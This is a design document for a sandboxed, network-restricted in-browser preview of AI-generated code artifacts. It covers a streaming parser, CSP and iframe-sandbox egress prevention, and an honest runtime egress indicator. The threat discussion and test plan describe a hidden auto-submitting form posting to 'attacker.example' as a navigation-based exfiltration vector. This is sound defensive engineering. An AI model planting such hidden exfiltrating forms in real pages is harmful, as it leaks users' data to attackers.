# Design Document

## Overview

Phase 4 adds a **Private On-Device Artifacts** stage: a live, in-browser preview
pane that extracts a renderable code artifact from the BUILD-path token stream
and runs it inside a network-restricted Sandpack sandbox. It mirrors the
existing pipeline stages (redaction, semantic cache, power telemetry): an
independently toggleable stage that adds a presentational panel and participates
in the existing generate flow without disturbing the other stages.

The work is almost entirely **frontend/integration**. The backend touch is
limited to (a) injecting an artifact-delimiter instruction into the BUILD-path
generation prompt when the stage is enabled, and (b) exposing an independent
stage toggle following the established in-memory-singleton pattern
(`redaction_state.py` / `power_state.py`). No backend endpoint ever compiles,
executes, or evaluates generated code — the preview is 100% client-side, which
keeps the "100% local, private" posture intact.

Two requirements are genuinely security-sensitive and are resolved explicitly in
this document rather than deferred:

- **The network-egress restriction (Req 4)** and its **honest verification
  (Req 5)** — resolved in [§5 Network egress: prevention](#5-network-egress-prevention-requirement-4)
  and [§6 Network egress: honest verification](#6-network-egress-honest-verification-requirement-5).
- **The Sandpack bundler's own network dependency (open question Q2)** —
  resolved in [§7 Sandpack client choice and the bundler network question](#7-sandpack-client-choice-and-the-bundler-network-question-open-question-q2).

All other open questions from requirements.md are resolved in [§12 Resolved open questions](#12-resolved-open-questions).

## Architecture

```
                 BUILD path only (Req 6)
   ┌───────────────────────────────────────────────────────────────┐
   │ backend/main.py (generate, phase="generate")                   │
   │   • if artifact stage enabled AND intent==BUILD:                │
   │       inject Artifact_Delimiter instruction into the prompt     │
   │   • /api/artifacts/toggle  (GET/POST, mirrors power/cache)      │
   └───────────────────────────┬───────────────────────────────────┘
                               │  Vercel AI SDK data-stream (0: text deltas)
                               ▼
   ┌───────────────────────────────────────────────────────────────┐
   │ frontend/app/page.tsx  (existing stream loop, accumulates code) │
   │   • feeds each text delta into the ArtifactStreamParser         │
   │   • on finish frame (d:) → parser.onStreamEnd()                 │
   └───────────────────────────┬───────────────────────────────────┘
             pure state machine │ (no React, no Sandpack)
                               ▼
   ┌───────────────────────────────────────────────────────────────┐
   │ artifactParser.ts   ArtifactStreamParser                        │
   │   states: OUTSIDE → IN_ARTIFACT → CLOSED  (+ secondary blocks)  │
   │   emits: { status, primaryCode, lang, extraBlocks }             │
   └───────────────────────────┬───────────────────────────────────┘
                               ▼
   ┌───────────────────────────────────────────────────────────────┐
   │ ArtifactPreview.tsx  (presentational; amber-sibling accent)     │
   │   • CLOSED+ok  → <Sandpack> STATIC client, egress-restricted    │
   │   • error/timeout/stream-end-open → raw code fallback (Req 7)   │
   │   • EgressIndicator (honest label per §6)                       │
   └───────────────────────────────────────────────────────────────┘
```

The parser is deliberately isolated from React and Sandpack so it can be
unit-tested on fixed chunk sequences (Req 2.6, and the lean testing plan).

## Components and interfaces

### 1. Backend: prompt injection + toggle

`backend/artifact_state.py` — a new state singleton mirroring `power_state.py`:
a thread-safe `ArtifactState` with `is_enabled()` / `set_enabled(value)` and a
module-level `state = ArtifactState()`. Default **enabled** (consistent with the
other stages' default-on posture; resolves Q6). In-memory only, JSON-serializable.

`backend/main.py`:
- In the `generate` branch, after intent routing, WHEN `artifact_state.is_enabled()`
  AND the request routed to **BUILD** (Req 6.1), append the Artifact_Delimiter
  instruction to the generation prompt (Req 1.1, 6.2). The instruction tells the
  model to wrap a single renderable artifact in
  `<<<TOKENQUICK_ARTIFACT:lang>>>` … `<<<END_ARTIFACT>>>` with `lang` one of the
  supported tags. On the PERFORM path the instruction is never injected (Req 6.1).
- `GET /api/artifacts/toggle` → `{"enabled": ...}`; `POST /api/artifacts/toggle`
  (reuse the existing `ToggleBody`) → `artifact_state.set_enabled(...)`; returns
  the new state. New state applies to generations that BEGIN after the change;
  in-flight generations keep their snapshot (Req 8.3), mirroring the power/cache
  toggle semantics exactly. Purely a prompt-shaping + UI flag; toggling it never
  touches redaction, cache, or power state (Req 8.4).

The delimiter is a prompt convention; the model is not perfectly reliable, which
is exactly why the parser (Req 2) and the fallback (Req 7) are the load-bearing
pieces, not the prompt.

### 2. The streaming parser (`frontend/lib/artifactParser.ts`)

A pure, synchronous, side-effect-free state machine (Req 2.1, 2.6). No React, no
Sandpack, no timers inside it — time-based classification lives in the component
(§4) so the parser stays deterministic and unit-testable.

```ts
export const OPEN_PREFIX = "<<<TOKENQUICK_ARTIFACT:";
export const OPEN_SUFFIX = ">>>";
export const CLOSE_MARKER = "<<<END_ARTIFACT>>>";

export type ParserState = "OUTSIDE" | "IN_ARTIFACT" | "CLOSED";

export interface ParseResult {
  state: ParserState;
  lang: string | null;        // parsed from the open marker (Req 1.4)
  primaryCode: string;        // partial while IN_ARTIFACT, final when CLOSED
  primaryClosed: boolean;     // true once the close marker was seen (Req 2.5)
  extraBlocks: string[];      // additional CLOSED blocks after the primary (Req 9)
  sawAnyMarker: boolean;      // false ⇒ treat generation as no-artifact (Req 1.5)
}

export class ArtifactStreamParser {
  push(chunk: string): ParseResult;  // feed one text delta; returns snapshot
  snapshot(): ParseResult;
}
```

Behavior:
- **Marker scanning with straddle buffering (Req 2.3):** the parser keeps an
  internal `pending` tail. It only consumes bytes it can fully classify; a
  trailing substring that is a *prefix of any marker* is retained in `pending`
  until the next `push` completes it. This is what prevents a marker split across
  two stream chunks from producing a false open/close.
- **Backticks inside the body (Req 1.3):** while `IN_ARTIFACT`, the ONLY token
  that ends the block is the exact `CLOSE_MARKER`. Triple backticks, language
  hints, and nested fences are appended to `primaryCode` verbatim.
- **Language tag (Req 1.4):** on the open marker, everything between `OPEN_PREFIX`
  and the next `OPEN_SUFFIX` is the `lang`. Empty/unknown → `lang = null`, and the
  component applies the default template (§3).
- **No-artifact stream (Req 1.5):** if the stream ends with `sawAnyMarker === false`,
  the component renders nothing in the preview and leaves the existing code/text
  output path untouched.
- **Multiple blocks (Req 9):** the FIRST opened block is the Primary_Artifact
  (deterministic, stream-order — Req 9.4). After the primary closes, subsequent
  complete blocks are captured into `extraBlocks` but never fed to Sandpack (Req
  9.1, 9.3). Rendering policy for `extraBlocks` is resolved in §12 (shown as plain,
  non-executed code beneath the preview — Req 9.2b).

The parser never throws on malformed input; it can only be in one of its three
states and always returns a coherent snapshot (Req 2.4).

### 3. Sandpack rendering (`frontend/components/ArtifactPreview.tsx`)

When the primary artifact is `CLOSED` and the stage is on (Req 3.1), the artifact
renders via the **Sandpack STATIC client** (see §7 for why static, not the
runtime bundler). Template selection from `lang` (Req 1.4, 3.2):

| `lang` tag              | Template          | Package resolution |
|-------------------------|-------------------|--------------------|
| `html` / (default/null) | static HTML/CSS/JS | none               |
| `react`                 | pre-vendored React static bundle (§7) | none (vendored) |

The preview runs inside a sandboxed iframe; no artifact code executes in the
top-level app context (Req 3.3). No backend endpoint compiles or runs the code
(Req 3.4).

### 4. Fallback + timeout classification (`ArtifactPreview.tsx`)

The component owns the time-based classification the parser deliberately omits.
It distinguishes the three fallback conditions of Req 7:

1. **Compile/bundle failure on a CLOSED block (Req 7.1):** Sandpack surfaces a
   bundler error → show the raw artifact code + a brief error affordance.
2. **Stream ended with the block still open (Req 7.4):** page.tsx calls
   `parser.onStreamEnd()` on the `d:` finish frame; if `state === "IN_ARTIFACT"`,
   classify as abandoned/malformed → raw-code fallback.
3. **Idle stall while open (Req 7.5):** the component tracks *time since the last
   token that changed `primaryCode`*. The classifier is **idle/stall-based
   (time-since-last-token), NOT wall-clock-since-open** (resolves Q3), so a
   steadily streaming slow response is never misclassified (Req 7.3). Concrete
   value: **`INCOMPLETE_BLOCK_IDLE_TIMEOUT_MS = 4000`** (4s of no new tokens while
   `IN_ARTIFACT`). While tokens keep arriving, the idle timer resets and the UI
   stays in the "still streaming, wait" affordance (Req 2.4, 7.2, 7.3).

In all fallback cases the raw artifact text is shown verbatim, with no partial
execution (Req 7.6).

### 5. Network egress: prevention (Requirement 4)

The prevention mechanism is the sandboxed iframe plus a restrictive CSP applied
to the preview document:

- The preview iframe uses a `sandbox` attribute WITHOUT `allow-same-origin`, so
  the framed document runs in an **opaque (unique) origin**. Under the same-origin
  policy, an opaque-origin document's outbound requests (`fetch`,
  `XMLHttpRequest`, `WebSocket`, `EventSource`, `sendBeacon`) are treated as
  cross-origin and blocked — this is the primary block for Req 4.2. (Sandboxing an
  iframe makes the browser treat its content as a different origin, which is what
  governs AJAX/network access — per the iframe-sandbox behavior described on
  [MDN and StackOverflow](https://stackoverflow.com/questions/14486461/iframe-sandbox-attribute-is-blocking-ajax-calls). Content was rephrased for compliance with licensing restrictions.)
- A CSP `<meta>` with `connect-src 'none'` (plus `default-src 'none'` and only the
  minimal `script-src`/`style-src`/`img-src` the static preview needs) is injected
  into the preview document as defense-in-depth for the network sinks (Req 4.1,
  4.2). **Critically, the CSP ALSO sets `form-action 'none'` and `base-uri 'none'`
  explicitly.** Per the CSP spec these directives do NOT inherit from
  `default-src`, so omitting them would leave a navigation-based exfiltration
  hole: a malicious artifact could auto-submit a hidden
  `<form action="https://attacker.example">`, which is a *navigation*, not a
  `fetch`/XHR/`WebSocket` call — it bypasses `connect-src` entirely and is not one
  of the five scripting sinks the in-sandbox listener wraps. `form-action 'none'`
  blocks the form submission, and `base-uri 'none'` prevents `<base>`-tag
  redirection of relative targets. Both are enforced via the `<meta>`-delivered
  policy and were VERIFIED in a real browser (Chrome refuses the fetch, blocks the
  form submission, and zero packets leave).
  **HONEST CAVEAT — `frame-ancestors 'none'` is a NO-OP here.** The CSP string also
  includes `frame-ancestors 'none'`, but per the CSP spec that directive takes
  effect ONLY when the policy is delivered as an HTTP RESPONSE HEADER; a
  `<meta>`-delivered CSP IGNORES it (Chrome logs a console warning confirming
  this). We keep it in the string because it is harmless and would become active
  if the preview ever moves to a header-delivered CSP served from our own origin
  (see tasks.md Task 12), but it is NOT actively hardening the preview today and
  nothing relies on it. Its clickjacking concern is low-severity for a
  self-authored srcdoc preview. The full preview CSP is therefore:
  `default-src 'none'; connect-src 'none'; form-action 'none'; frame-ancestors
  'none'; base-uri 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
  img-src data:` (with only the minimal keyword/scheme sources the static template
  requires). This closes the form/navigation vector alongside the network sinks (Req 4.1,
  4.2). Note that a sandboxed unique-origin page cannot name a scheme-less host in
  CSP, so the policy is expressed with keyword sources (`'none'`, `'self'`,
  `'unsafe-inline'` only where the static template requires it) — consistent with
  the [documented sandbox+CSP interaction](https://stackoverflow.com/questions/24410553/iframe-sandbox-with-content-security-policy). Content was rephrased for compliance with licensing restrictions.
- The restriction is applied to every preview regardless of artifact content and
  is not derived from anything in the generated code (Req 4.3). There is **no
  allowlist of third-party origins** — the posture is deny-outbound (Req 4.4).
- Critically, we do NOT combine `allow-scripts` with `allow-same-origin`: a frame
  granted both can remove its own sandboxing, which would defeat the restriction
  (per the [documented escape](https://stackoverflow.com/questions/67223608/how-can-an-iframe-remove-its-own-sandboxing)). Content was rephrased for compliance with licensing restrictions. We keep `allow-scripts` (needed to run the artifact) but omit `allow-same-origin`.

The narrow local-origin requirement of the bundler runtime (Req 4.5) is resolved
by choosing the static client and self-/co-hosting its preview assets (§7), so
there is no third-party outbound dependency at preview time.

### 6. Network egress: honest verification (Requirement 5)

**Resolution of load-bearing open question 5.6:** A cross-origin / opaque-origin
child iframe does **not** propagate its `securitypolicyviolation` events to the
host document, and by design (no `allow-same-origin`) the host cannot script into
the framed document to read them. Therefore the host app **cannot reliably
observe** the sandbox's blocked outbound attempts from the outside. We resolve
5.6 by NOT pretending otherwise. Two honest options were considered:

- **(A) Inject a listener into the preview document itself.** Because we control
  the static template's bootstrap HTML, we CAN add, inside the sandboxed document,
  a `window.addEventListener('securitypolicyviolation', …)` plus wrappers that
  count blocked `fetch`/`XHR`/`WebSocket`/`EventSource`/`sendBeacon` attempts, and
  report the tally to the host via `postMessage`. **The same instrumentation ALSO
  covers the form-submission / navigation vector** (Req 4.2): the bootstrap adds a
  capture-phase `submit` listener that intercepts any `<form>` submission and
  `preventDefault()`s it before the default action, counting it as a blocked
  outbound attempt; and the `securitypolicyviolation` handler additionally matches
  `event.violatedDirective` of `form-action` (and `base-uri`), so a form submission
  blocked by the CSP is caught and reported through the SAME honest counter as the
  five scripting sinks — not left as a silent blind spot. This is a genuine runtime
  signal: it fires only when an actual outbound attempt is blocked (Req 5.2), and its absence after
  real execution is meaningful (Req 5.3). Its honesty caveat: the counter lives in
  the same sandbox as the artifact, so it is a good-faith telemetry signal, not a
  tamper-proof security boundary — the *security* guarantee is the CSP+sandbox of
  §5, and this listener only *observes* it.
- **(B) No runtime signal; label "restriction configured."** If (A) proves
  unreliable across browsers, the indicator MUST read "restriction configured"
  and MUST NOT claim "0 calls verified" (Req 5.4).

**Chosen design:** implement **(A)** — inject the in-sandbox violation listener +
network-sink wrappers into the static preview bootstrap and surface the count to
the host by `postMessage`. The `EgressIndicator` then renders one of:

- **"0 outbound calls (verified)"** — the in-sandbox listener is active AND has
  observed zero blocked attempts after the artifact ran (Req 5.3).
- **"blocked N outbound attempt(s)"** — the listener caught and logged ≥1 blocked
  attempt; the attempt was prevented by §5 and detected here (Req 5.2).
- **"restriction configured (not runtime-verified)"** — the `postMessage`
  handshake from the sandbox did not establish (listener could not be confirmed);
  we fall back to the honest configured-only label (Req 5.4).

The indicator NEVER derives "verified" from the mere *presence* of the CSP string
in configuration (Req 5.1, 5.5): "verified" requires the live handshake + the
active listener. The distinction between prevention (§5) and verification (§6) is
explicit in both the code comments and the UI copy.

### 7. Sandpack client choice and the bundler network question (open question Q2)

**Fact (attributed):** Sandpack's default runtime bundler downloads npm modules
over the network — its documented connectivity note says it needs an initial
network connection to fetch node modules from a CodeSandbox CDN and to load
preview domains, and only works offline thereafter
([Sandpack docs, via DocSearch](https://docsearch.algolia.com/mcp/docs/repo/codesandbox/sandpack)).
The bundler itself is hosted on a `codesandbox.io` subdomain and CDN-cached, and
may be self-hosted ([Sandpack: Hosting the Bundler](https://sandpack.codesandbox.io/docs/guides/hosting-the-bundler)).
Separately, the **static** client (`SandpackStatic`, backed by
[`static-browser-server`](https://github.com/codesandbox/static-browser-server))
"mounts a simple service worker used for a static template, allowing vanilla
sandboxes" with **no bundler and no npm resolution** ([Sandpack Client docs](https://sandpack.codesandbox.io/docs/advanced-usage/client)).
Its preview controller points at a hosted wildcard domain that can be self-hosted
([Sandpack: Static](https://sandpack.codesandbox.io/docs/advanced-usage/static)).
All quotations above are paraphrased; content was rephrased for compliance with
licensing restrictions.

**Conclusion:** the default runtime bundler is **incompatible** with Req 4's
"deny outbound, no allowlist" posture — it fetches dependencies from a
third-party CDN. Per the requirement, the design must choose (a) restrict to
templates with no external package resolution, or (b) accept a narrow documented
exception. **We choose (a), decisively:**

- Use **`SandpackStatic`** (the static, bundler-less client) for the `html`
  template — vanilla HTML/CSS/JS resolves zero packages over the network.
- For the `react` template, ship a **pre-vendored/pre-bundled React static
  bundle** served from our own origin (bundled into the frontend's own assets at
  build time), so React resolves with **no runtime package fetch**. If a
  fully-vendored React static preview proves impractical in implementation, the
  `react` template is dropped to a follow-up and only `html` ships — we do NOT
  fall back to the network bundler.
- **Self-host the static-browser-server preview assets** on our own origin so even
  the static client's preview-controller domain is not a third-party outbound
  dependency (closing the Req 4.5 gap).

Option (b) — a narrow exception for bundler dependency-fetch traffic — is
explicitly **rejected**: it would require allowlisting a third-party CDN, which
directly contradicts Req 4.4's no-allowlist posture and would make the "0 outbound
calls" indicator dishonest. Choosing the static/vendored path keeps prevention
(§5), verification (§6), and Q2 mutually consistent.

### 8. Frontend wiring (`frontend/app/page.tsx`)

- Instantiate one `ArtifactStreamParser` per generation. In the existing stream
  loop, feed each `0:` text delta into `parser.push(delta)` (the code already
  accumulates deltas for `generatedCode`; this is an additional pure call).
- On the `d:` finish frame (or stream close), call `parser.onStreamEnd()` so the
  component can apply the stream-end-open classification (Req 7.4).
- Hold `const [artifactState, setArtifactState] = useState<ParseResult | null>(null)`
  and update it from the parser snapshot; render `<ArtifactPreview .../>` in the
  right pane. Reset to `null` in both `triggerGenerate` and `resetChat`, matching
  the other panels.
- The stage toggle is added as a fourth row in `RedactionSettings.tsx` beside
  redaction / cache / power, loaded via the initial `Promise.all` and flipped via
  a `handleArtifactToggle` mirroring `handlePowerToggle` against
  `/api/artifacts/toggle` (Req 8.1, 8.3).

### 9. Redaction interaction (Requirement 10)

Out of scope and requires zero code: redaction placeholders (e.g.
`⟦REDACTED_<CATEGORY>⟧`) are ordinary characters in the artifact body. The parser
appends them verbatim and Sandpack renders them as literal mock text (Req 10.1,
10.2). The stage adds no dependency on redaction state (Req 10.3).

## Data models

`ParseResult` (see §2) is the single shared shape between the parser, page.tsx,
and the preview component. The `EgressIndicator` consumes a small
`EgressStatus = { mode: "verified-zero" | "blocked" | "configured-only"; blockedCount: number }`
derived from the sandbox `postMessage` handshake (§6). No backend data model
changes beyond the toggle flag.

## Error handling

- **Parser:** cannot throw; always returns a valid snapshot (Req 2.4). Malformed
  input degrades to raw-code fallback via the component, never a crash.
- **Sandpack bundle error:** caught via Sandpack's error surface → raw-code
  fallback (Req 7.1).
- **postMessage handshake failure (§6):** degrades the indicator to
  "restriction configured (not runtime-verified)" (Req 5.4) — never a false
  "verified."
- **Toggle endpoint failure:** the settings row shows a small inline error and
  keeps the last known state, mirroring the power/cache toggle rows.

## Correctness Properties

Stated as invariants for reference. Consistent with the lean testing directive,
these are verified by targeted unit tests and one focused security check (see
Testing Strategy) — NOT by property-based testing.

### Property 1: Parser totality
For any sequence of pushed chunks, `ArtifactStreamParser` returns a valid
`ParseResult` and never throws; its state is always one of
`OUTSIDE | IN_ARTIFACT | CLOSED`.

**Validates: Requirements 2.1, 2.4**

### Property 2: Marker-straddle correctness
Splitting either marker across chunk boundaries at any offset yields the same
result as feeding it whole — no false open/close.

**Validates: Requirements 2.3**

### Property 3: Body opacity
While `IN_ARTIFACT`, only the exact `CLOSE_MARKER` ends the block;
backticks/fences are literal content.

**Validates: Requirements 1.3**

### Property 4: Deterministic primary
The first opened block is always the Primary_Artifact; additional blocks never
reach Sandpack.

**Validates: Requirements 9.1, 9.3, 9.4**

### Property 5: Egress prevention
The preview iframe always has `allow-scripts` WITHOUT `allow-same-origin` and a
CSP that sets `default-src 'none'`, `connect-src 'none'`, `form-action 'none'`,
`frame-ancestors 'none'`, and `base-uri 'none'` (the latter three explicitly,
since they do not inherit from `default-src`), independent of artifact content.

**Validates: Requirements 4.1, 4.2, 4.3, 4.4**

### Property 6: Honest verification
The egress indicator reports "verified" ONLY when the in-sandbox runtime listener
handshake is live; otherwise it reports "restriction configured (not
runtime-verified)" — never derived from config presence alone.

**Validates: Requirements 5.1, 5.4, 5.5**

### Property 7: No false fallback
While tokens keep arriving, the stage never falls back; fallback fires only on
bundle error, stream-end-while-open, or an idle stall past the timeout.

**Validates: Requirements 7.1, 7.3, 7.4, 7.5**

## Testing Strategy

(Lean, per directive.) This is UI/integration work, so the mandatory automated coverage is **lightweight
unit tests on the parser state transitions** — no property-based testing.

Mandatory parser unit tests (`artifactParser.test.ts`):
1. `OUTSIDE → IN_ARTIFACT → CLOSED` happy path with a single block.
2. **Split-marker buffering (Req 2.3):** the open and close markers each split
   across two `push` calls at every byte offset of the marker; assert no false
   open/close and correct final code.
3. **Backticks inside the body (Req 1.3):** an artifact whose body contains
   ```` ``` ```` fences and a nested `<<<END` near-miss string; assert the block
   only closes on the exact `CLOSE_MARKER`.
4. **No-artifact stream (Req 1.5):** plain prose in → `sawAnyMarker === false`,
   `primaryCode === ""`.
5. **Stream-end-while-open (Req 7.4):** open marker, partial body, `onStreamEnd()`
   → still `IN_ARTIFACT`, component would fall back (assert parser reports open).
6. **Multiple blocks (Req 9.4):** two complete blocks → first is `primaryCode`,
   second in `extraBlocks`; primary selection is deterministic.
7. **Language tag parse (Req 1.4):** `html`, `react`, empty, and unknown tags.

Security surfaces (Req 4/5) are validated by a focused check, not broad PBT:
- A manual/integration check that the preview iframe has `allow-scripts` WITHOUT
  `allow-same-origin` and carries the full preview CSP — asserting `default-src
  'none'`, `connect-src 'none'`, and explicitly `form-action 'none'`,
  `frame-ancestors 'none'`, and `base-uri 'none'` are all present.
- A test artifact that attempts `fetch()` on run, asserting the in-sandbox
  listener reports a blocked attempt (the §6 verified/blocked path), and that a
  clean artifact yields the "verified-zero" state.
- A test artifact containing a **hidden auto-submitting `<form>` targeting an
  external URL** (e.g. `action="https://attacker.example"` with a script-triggered
  `.submit()` on load), asserting the submission is BOTH blocked (no navigation /
  no off-origin request leaves the sandbox) AND reported by the egress indicator as
  a blocked outbound attempt — exercised the same way as the `fetch()` case, so the
  form/navigation vector is covered by the identical honest verification path.

Backend: one small test that the toggle endpoints round-trip and that the
delimiter instruction is injected only on the BUILD path with the stage enabled.

## 12. Resolved open questions

1. **(5.6, load-bearing) Runtime egress signal feasibility** → Resolved in §6:
   host CANNOT observe a no-`allow-same-origin` child's CSP violations from
   outside, so we inject an in-sandbox `securitypolicyviolation` + network-sink
   listener into the static preview bootstrap and report via `postMessage`
   (option A). Honest fallback label "restriction configured (not runtime-verified)"
   when the handshake fails. Never a config-presence check dressed as verification.
2. **(Q2, load-bearing) Sandpack bundler network dependency** → Resolved in §7:
   the default runtime bundler fetches npm deps from a third-party CDN and is
   INCOMPATIBLE with Req 4's no-allowlist deny-outbound posture. We choose option
   (a): `SandpackStatic` for `html`, a pre-vendored React static bundle for
   `react`, and self-hosted static-preview assets. Option (b) network exception is
   explicitly rejected.
3. **(7.5) Incomplete_Block_Timeout** → §4: idle/stall-based
   (time-since-last-token), value `4000 ms`; steady slow streaming never trips it;
   only a stall or stream-end-while-open falls back.
4. **(9.2) Additional blocks** → §2/§12: shown as plain, non-executed code beneath
   the rendered primary (option 9.2b); never bundled or executed.
5. **(1.4 / 3.2) Supported templates + default** → §3: `html` (default when tag
   missing/unknown) and `react` (pre-vendored, static). Unknown tag → `html`.
6. **(8.1) Toggle default** → §1: default **enabled**, consistent with the other
   stages.
